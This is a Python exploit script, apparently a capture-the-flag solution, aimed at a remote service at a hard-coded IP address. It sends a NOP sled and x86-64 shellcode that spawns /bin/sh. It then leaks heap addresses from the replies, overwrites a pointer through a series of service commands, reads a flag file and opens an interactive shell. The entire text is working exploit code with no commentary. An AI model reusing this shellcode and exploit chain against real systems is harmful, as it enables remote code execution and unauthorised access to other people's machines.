import sys
sys.path.append("/home/blankwall/Template")

from isis import *
pattern = file("/home/blankwall/Template/pattern").read()
debug = True
host = "54.165.225.121"
#host = "localhost"
port = 5333
#port = 2323

def connect():
	s = get_socket((host,port))
	s.settimeout(0x10000000)
	return s

s = connect()
if debug:
	raw_input("?")

recv_all(s)

shellcode =  "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = "\x90" * 400
payload += shellcode

time.sleep(1)

s.send("c 1 " + payload + "\n")
x = s.recv(0x50)
k = [int(l) for l in x.split() if l.isdigit()][0]
print "Buffer @ " + hex(k+0x20)
buffer_ = lei64((k+0x20))

recv_all(s)
s.send("c 1 " + buffer_ + "\n")
x = s.recv(0x50)
print x
k = [int(l) for l in x.split() if l.isdigit()][0]
print "Buffer @ " + hex(k+0x20)
buffer1 = lei64((k+0x20)-0x10)


pattern = "A" * 7
pattern += buffer1
s.send("c 1 " + pattern + "\n")
print  " HERE " + s.recv(0x50)

x = s.recv(0x50)
print x
k = [int(l) for l in x.split() if l.isdigit()][0]

s.send("u " + str(k) + "\n")

x = s.recv(0x50)
print x
k = [int(l) for l in x.split() if l.isdigit()][0]

s.send("r " + str(k) + "\n")

s.send("cat /home/amazon/flag \n")
telnet_shell(s)